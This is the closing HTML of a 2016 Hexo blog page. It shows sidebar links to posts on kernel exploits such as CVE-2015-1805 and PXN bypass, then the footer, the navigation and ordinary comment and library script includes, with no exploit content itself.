            <a href="/2016/09/04/exploit-perf_event-vul/">PERF_EVENT VUL</a>
          </li>
        
          <li>
            <a href="/2016/08/09/exploit-bypass-pxn/">绕过PXN保护</a>
          </li>
        
          <li>
            <a href="/2016/07/07/exploit-cve-2015-1805/">CVE-2015-1805</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 idhyt<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    
<script>
  var disqus_shortname = 'idhyt';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>


<script src="/js/script.js" type="text/javascript"></script>

  </div>
</body>
</html>